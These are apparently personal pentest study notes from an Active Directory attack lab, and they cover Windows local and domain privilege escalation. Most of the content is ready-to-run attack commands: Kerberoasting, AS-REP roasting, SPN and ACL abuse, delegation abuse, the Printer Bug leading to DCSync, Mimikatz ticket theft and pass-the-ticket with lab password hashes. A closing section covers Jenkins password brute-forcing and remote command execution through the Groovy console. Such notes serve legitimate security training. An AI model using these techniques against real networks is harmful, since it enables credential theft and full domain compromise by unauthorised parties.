# Privilege Escalation
> Mainly focus on the Domain Privilege Escalation
Table of Content
1. [test](#test)


## Local Privilege Escalation
> See [Window Privilege Escalation](#test)

All check
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

Service abuse
```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx'
```

## Domain Privilege Escalation
### Kerberoasting
The offline cracking technique which crack the hashes of service accounts via TGS
> TODO what to do next after retrieve the password

1. Find user accounts used as Service accounts -> Read the service principal name, for this exmaple, we use **MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local**
```powershell
#PowerView
Get-NetUser -SPN

#ActiveDirectory module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
![service account](./images/service_account.png)

2. Request a TGS
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local" 
```

3. Check if the TGS has been granted
```powershell
klist
```

4. Extract
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
5. Crack the Service account password
```powershell
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorpmgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

### AS-REP Roasting
If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.

>With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well

1. Find users which Kerberos preauth is disabled
```powershell
# Using PowerView (dev):
 . .\PowerView_dev.ps1
Get-DomainUser -PreauthNotRequired -Verbose

# Using ActiveDirectory module:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
Or you could disable them
```powershell
#Let's enumerate the permissions for RDPUsers on ACLs using PowerView(dev):
Invoke-ACLScanner -ResolveGUIDs |?{$_.IdentityReferenceName -match "RDPUsers"}

# Disable
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose
```

2. Request encrypted AS-REP for offline brute-force.
```powershell
. .\ASREPRoast-master\ASREPRoast-master\ASREPRoast.ps1
# specific user
Get-ASREPHash -UserName VPN1user -Verbose

# To enumerate all users with Kerberos preauth disabled and request a hash
Invoke-ASREPRoast -Verbose
```

3. Cracking the hashes
Using john.
```powershell
./john vpn1user.txt --wordlist=wordlist.txt
```


### Kerberoasting - Set SPN
With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).

We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".

1. find the interesting user
```powershell
# Check who we can control
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# check if they already have SPN (Powerview (dev))
Get-DomainUser -Identity support134user | select serviceprincipalname

# Using ActiveDirectory module:
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```

2. Set a SPN for the user (must be unique for the domain)
```powershell
#using Powerview (dev) - Ignore error
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}

#Using ActiveDirectory module:
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}
```

3. Request a ticket (same as simple kerberoast)
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
```

3. Check if the TGS has been granted
```powershell
klist
```
4. Extract
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
5. Crack the Service account password
```powershell
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@ops~whatever1-dollarcorp.moneycorp.LOCAL.kirbi
```
Alternatively, we can use PowerView_dev for requesting a hash:
```powershell
Get-DomainUser -Identity supportXuser | Get-DomainSPNTicket | select -ExpandProperty Hash
```

## Kerberos Delegataion
### Unconstrained Delegation
> allows delegation to any service to any resource on the domain as a user
1. find conputer that allow Unconstrained Delegation
```powershell
Get-NetComputer -UnConstrained

# Using ActiveDirectory module:
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```
2. Compromise the server(s) where Unconstrained delegation is enabled. 
3. Run following command on it to check if any DA token is available
```powershell
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
```
4. if not, wait for a domain admin to connect a service on appsrv
> We can use the following PowerView command to wait for a particular DA to access a resource on dcorp-adminsrv
```powershell
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```
5. reuse DA token
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;271d9f]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```
#### The Printer Bug
>  trick a high privilege user to connect to a machine with Unconstrained Delegation (Printer Bug + Unconstrained Delegation = DCsync)

1. Capture the TGT of dcorp-dc$ by using [Rubeus](https://github.com/GhostPack/Rubeus) on dcorp-appsrv
```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```
2. After that run [MS-RPRN.exe](https://github.com/leechristensen/SpoolSample) on the student VM:
```powershell

.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

3. Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
```powershell
.\Rubeus.exe ptt /ticket:
```

4. Once the ticket is injected, run DCSync:
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync/user:dcorp\krbtgt"
```

### Constrained Delegation
> allows access only to specified services on specified computers as a user. 

1. Enumerate users and computers with constrained delegation enabled
```powershell
# Using PowerView_dev.ps1
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Using ActiveDirectory module:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne"$null"} -Properties msDS-AllowedToDelegateTo
```
2. Using asktgt from Kekeo to request a TGT using hash/plaintext password of websvc
```
.\kekeo.exe
kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
```

3. Using s4u from Kekeo to request a TGS --> request TGS as ANY user
```
kekeo# tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```

4. then use mimikatz to [pass] the ticket
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorpmssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

#### Using Rubeus
```powershell
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```
#### Constrained Delegation to any service running under the same account
> We can request for alternative services such as: HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights).

In this example, only TIME service is allow but we can also Request for LDAP.

Using kekeo 
```
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```
Using Rubeus
```powershell
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:1fadb1b13edbc5a61cbdc389e6f34c67 /impersonateuser:Administrator /msdsspn:"time/dcorpdc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt
```



# Jenkin --> move to CVE catagory
1. jenkin default allow us to read user and computer
2. jenkin dosn't have rate limit which we can burte force if we know the username (form author perspective try guessing password as username or reversed username)
3. with administrator privileges we can run groovy script on the system

>If you have Admin access (default installation before 2.x), go to http://<IP>/script
In the script console, Groovy scripts could be
```Groovy
executed.def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
5. with normal user, we may can create configuration for the project and we can run OS command via the configuration. (checking permission on burp intruder appending the /configure to the project file) - you need to check every project

>If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter: **powershell –c**

>Again, you could download and execute scripts, run encoded scripts and more.

>In the real world, make our configuration code run before the already-have-code.